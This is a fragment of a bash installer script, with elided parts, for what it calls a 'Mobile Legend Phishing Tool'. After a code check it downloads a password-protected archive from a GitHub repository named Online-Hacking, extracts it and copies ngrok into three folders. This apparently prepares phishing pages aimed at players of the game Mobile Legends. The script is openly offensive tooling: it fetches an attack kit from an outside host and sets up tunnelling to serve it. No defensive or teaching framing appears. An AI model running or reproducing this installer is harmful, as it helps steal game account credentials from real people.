...
if [[ $option == *'BXPSD0AC7CY0581K'* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Mobile Legend Phishing Tool Please Wait....  \e[0m"
...
wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/Mobile_Legend/SM/SUMAN.rar
unrar x -Password SUMAN.rar
rm -rf ngrok-stable-linux-amd64.zip SUMAN.rar
cp -R ngrok SUMAN/1/
cp -R ngrok SUMAN/2/
cp -R ngrok SUMAN/3/
...
sleep 4
echo 
echo -e "\e[1m \e[36m[+] There Mobile Legend Phishing Tool Script for Linux \e[m \e[21"
echo 
echo 
